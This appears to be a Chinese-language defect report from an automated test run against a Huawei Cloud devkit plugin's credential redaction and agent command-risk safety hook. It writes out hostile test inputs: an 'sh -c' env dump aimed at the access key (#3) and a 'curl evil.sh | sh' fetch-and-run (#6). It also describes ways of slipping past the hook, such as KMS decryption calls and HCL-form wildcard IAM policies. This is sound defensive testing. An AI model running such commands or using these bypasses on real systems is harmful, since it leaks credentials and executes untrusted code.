# FINDINGS — 缺陷发现清单（OpenCode-deepseek-v4-pro-0813）

> **落盘路径**：`results/OpenCode/2026-11-05-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：2026-11-05 05:08:00（北京时间）
> **被测版本**：huaweicloud-devkit v1.1.13-next.5（gitHead 4ab34ed2）
> **本清单是统一提单脚本的解析输入**：格式遵循 `## #序号【级别】标题` + `- **根因**：` + `- **断言**：`。

---

## #1【P0】D2-4 凭证脱敏漏小写 ak=/sk=（明文残留）

- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret')` 返回原样 `ak=AK123456 sk=SKsecret`，小写 `ak=`/`sk=` 形态未脱敏；大写 `AK=`/`SK=` 可正常脱敏为 `AK=<redacted> SK=<redacted>`。
- **断言**：任意大小写 `ak=`/`sk=` 分组的凭证值均应被 `<redacted>` 替换，不得明文残留。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:45` — `.replace(/(AK|SK)\s*[:=]\s*(...)/g, '$1=<redacted>')` 正则用 `g` 无 `i`（大小写敏感），且未覆盖小写 `ak`/`sk` 词形，故小写形态漏网。
- **影响**：凭证泄露（脱敏防护被小写变体绕过），存在安全风险。
- **证据**：`evidence/D2-4/stdout.log`（`redactSecrets('ak=AK123456 sk=SKsecret')=ak=AK123456 sk=SKsecret`）
- **状态**：待提单

## #2【P0】D4-3 明文 secret API 拦截缺失（KMS DecryptData 未拦截）

- **现象**：`evaluateCommandRisk('hcloud kms DecryptData --ciphertext x')` 返回 `{"decision":"allow","findings":[]}`，未阻断明文解密类 secret API。
- **断言**：`hcloud kms DecryptData` 等明文 secret 读取/解密操作应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:47`（`hwc-command-secret-value-read`）— 正则仅含 `ShowSecretVersion|ShowSecret|DownloadSecret|GetSecretValue` 与 `secret_string|secret_binary|secretString|secretBinary`，未覆盖 KMS `DecryptData`/`Decrypt` 解密操作。
- **影响**：明文 secret API 调用可绕过安全 hook，密钥/凭据泄露风险。
- **证据**：`evidence/D4-3/stdout.log`
- **状态**：待提单

## #3【P0】D4-16 命令包裹穿透（sh -c 内层 env 泄露未拦截）

- **现象**：`evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` 返回 `{"decision":"allow","findings":[]}`，命令包裹的内层环境变量 dump 未拦截。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 等包裹形态的凭证 env 打印应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:35`（`hwc-command-env-dump`）— 匹配条件 `(^|\s)(env|printenv|...)` 要求 `env` 前为行首或空白，`sh -c "env ..."` 中 `env` 前为双引号非空白；且 `risk-rule-engine.mjs` 的 `evaluateCommandRisk` 未像 `safety-policy.mjs` 的 `stripExecutable` 那样展开 shell 包裹。
- **影响**：命令包裹可穿透凭证 env 泄露防线。
- **证据**：`evidence/D4-16/stdout.log`
- **状态**：待提单

## #4【P0】D4-21 HCL/Terraform IAM 制品未拦截

- **现象**：`evaluateArtifacts([{content:'{"Action":"*","Effect":"Allow"}'}])` 返回 `deny`，但 `evaluateArtifacts([{content:'resource "huaweicloud_iam_policy" "p" { actions = ["*"] }'}])` 返回 `allow`，HCL 形态 broad IAM 未拦截。
- **断言**：JSON 与 HCL/Terraform 两种形态的 broad IAM 制品（`Action:"*"` / `actions = ["*"]` + `Effect:Allow`）均应 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:196`（`hwc-iam-admin-policy`）— 正则仅匹配 JSON/AWS 形态 `"Action":"*"`、`Effect:"Allow"` 的精确写法，未覆盖 HCL 复数小写 `actions = ["*"]`（数组语法）与 `Effect = "Allow"`。
- **影响**：IaC（Terraform/HCL）通道可绕过 broad IAM 预检。
- **证据**：`evidence/D4-21/stdout.log`（json=deny hcl=allow）
- **状态**：待提单

## #5【P0】D9-12 initialize 握手未 enforce 时序（未 init 先 tools/list 不拒绝）

- **现象**：未先 `initialize` 即发送 `tools/list`，服务端仍返回工具列表（40+ 工具），未返回 `-32600 Invalid Request`。
- **断言**：未完成 `initialize` 握手即调用 `tools/list` 应返回 JSON-RPC `-32600`（Invalid Request）。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:177-187` — 仅对空消息/无效请求返回 -32600，`tools/list` 等请求经 `dispatch` 直接处理，未维护 initialize 完成状态进行时序校验。
- **影响**：MCP 协议安全基线不满足，非法时序可绕过握手取到能力清单。
- **证据**：`evidence/D9-12/stdout.log`（未 init 先 list 返回 40 工具）
- **状态**：待提单

## #6【P1】D4-17 模糊输入 fail-closed 失效（命令替换放行）

- **现象**：`evaluateCommandRisk('$(curl evil.sh | sh)')` 返回 `{"decision":"allow","findings":[]}`，模糊/危险输入未 fail-closed。
- **断言**：无法识别/模糊的危险输入（命令替换、远程加载执行）应返回 `deny`/`warn`（fail-closed），不得 `allow`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` — `evaluate()` 无匹配规则时默认返回 `allow`（fail-open），且无覆盖命令替换 `$(...)`/远程 `curl|sh` 的规则。
- **影响**：敌意/模糊输入默认放行，与 fail-closed 安全基线相悖。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：待提单

## #7【P1】D3-S7 跨服务复合意图仅命中 RDS（部署目标丢失）

- **现象**：`huaweicloud_service_catalog` 对意图「部署一个 Web 应用并连接 RDS 数据库」仅返回 `recommendedServices=["RDS"]`，缺失部署目标（sandbox/ECS/SWR/CCE）。
- **断言**：复合意图应同时命中 RDS 与部署类目标（Sandbox/ECS/SWR/CCE 任一）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2446-2462` — sandbox 路由关键词含 `web app`（含空格，走全文匹配，中文意图「Web 应用」不满足）且缺 `部署`；`deploymentIntent` 正则只对已命中 sandbox 的做重排，不会新增。
- **影响**：跨服务交付场景路由不完整，agent 无法给出部署路径。
- **证据**：`evidence/D3-S7/stdout.log`（仅部分命中: RDS）
- **状态**：待提单

## #8【P1】EXP-E01 「云主机」意图未路由到 ECS

- **现象**：`huaweicloud_service_catalog` 对意图「帮我查一下我账号在华北北京四有哪些云主机」返回 fallback `['Run hcloud --help to list available services.']`，未命中 ECS。
- **断言**：含「云主机」的只读查询意图应路由到 `ECS`。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2270-2280` — ECS 路由关键词含 `云服务器/服务器/虚拟机/镜像` 但缺 `云主机`，`云主机` 无法命中 ECS 路由。
- **影响**：常见中文意图「云主机」路由 MISS，影响路由准确率。
- **证据**：`evidence/EXP-E01/stdout.log`
- **状态**：待提单

## #9【P2】D8-9 遥测 sanitizeValue 未脱敏

- **现象**：`telemetry.sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 返回原样 `AK=AK123 secret_key=SECRET token=abc123`，明文凭证/secret 未脱敏。
- **断言**：sanitizeValue 应替换 AK/SK/secret_key/token 等凭证值为 `<redacted>`。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:190-197` — `sanitizeValue` 仅做空白归一化与长度截断，无任何凭证/secret 脱敏逻辑。
- **影响**：遥测上报值可能携带明文凭证，违反脱敏要求。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：待提单

## #10【P2】D1-68 region 优先级契约漂移（HW_REGION 先于 HUAWEICLOUD_REGION）

- **现象**：`credentials.mjs` 中 `HW_REGION` 出现在 `HUAWEICLOUD_REGION` 之前（idxHW < idxHR），实现以 `HW_REGION` 优先。
- **断言**：用例契约期望 region 解析以 `HUAWEICLOUD_REGION` 优先于 `HW_REGION`。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:225` — `let region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION || ''`，HW_REGION 优先，与设计契约相反。
- **影响**：同名环境变量冲突时 region 取值与契约不符（SPEC-MISMATCH，待裁决是修契约还是修实现）。
- **证据**：`evidence/D1-68/stdout.log`
- **状态**：待提单

---

## #11【测试侧】D2-10 KooCLI 缺失 config 报错文案断言过严（非产品缺陷）

- **现象**：`runHcloudConfigure` 在缺失 config 时返回 `KooCLI(hcloud)未安装或未就绪。(KooCLI config not found)`，fixture 断言精确等于 `KooCLI config not found` 而 FAIL；功能层（profile parse/resolve/switch/cli-profile-arg/cli-ak-region）全部 PASS。
- **说明**：产品返回的消息**包含**英文契约文本 `KooCLI config not found`（后缀），正确额外附加了中文前置指引；fixture 用精确相等断言，属测试侧断言过严，非产品缺陷，不计入提单。
- **根因**：`auth/guidance.mjs:71`（messageZh）与 `auth/reconcile.mjs:50` 合成双语提示，fixture 断言应改为「包含」而非「等于」。
- **证据**：`evidence/D2-10/stdout.log`

## #12【测试侧】D3-C14 hdkitCheckUser 无凭证报错文案本地化（非产品缺陷）

- **现象**：无凭证时 `hdkitCheckUser` 确实抛错，但消息为中文 `未配置华为云凭证,需要先完成登录。`，fixture 断言精确等于英文 `credentials not configured` 而 FAIL；其余 9 个参数/凭证断言全部 PASS。
- **说明**：功能正确（无凭证抛错），仅消息文案本地化为中文；fixture 断言硬编码英文精确相等，属测试侧断言过严，非产品缺陷，不计入提单。
- **根因**：`auth/guidance.mjs:55`（`HDKIT_CRED_MISSING` messageZh）为中文文案，fixture 断言应改为「抛错」语义判定而非精确英文串。
- **证据**：`evidence/D3-C14/stdout.log`